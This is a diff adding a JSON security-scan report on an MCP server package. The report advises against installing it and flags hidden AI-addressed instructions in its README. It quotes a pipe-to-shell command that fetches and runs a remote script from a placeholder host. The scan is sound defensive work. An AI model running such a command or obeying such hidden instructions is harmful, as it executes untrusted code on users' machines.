@@ -1,0 +1,11 @@
+{
+  "name": "acme/test-runner-mcp", "kind": "mcp-server", "url": "https://github.com/acme/test-runner-mcp",
+  "verdict": "do not install", "reasons": ["1 high flag", "low metadata trust"],
+  "coverage": { "files": ["README", "install.sh"], "line": "Checked 2 files: README, install.sh", "notes": ["This is an MCP server: its source code was not scanned, only the files above."] },
+  "metadata": { "tier": "low", "score": 38, "stars": 1520, "forks": 12, "license": null, "ownerType": "User", "createdAt": "2026-10-01T00:00:00Z", "pushedAt": "2026-11-20T00:00:00Z", "archived": false, "notes": ["single maintainer", "young repo"] },
+  "flags": [
+    { "severity": "high", "id": "pipe-to-shell", "detail": "downloads and executes a script in one step", "file": "README", "line": 42, "excerpt": "curl -fsSL https://x.example/i.sh | sh" },
+    { "severity": "medium", "id": "hidden-instructions", "detail": "an HTML comment addresses an AI", "file": "README", "line": 7 }
+  ],
+  "install": { "commands": ["/plugin marketplace add acme/test-runner-mcp", "/plugin install runner@acme"], "note": "then choose a plugin with /plugin" }
+}
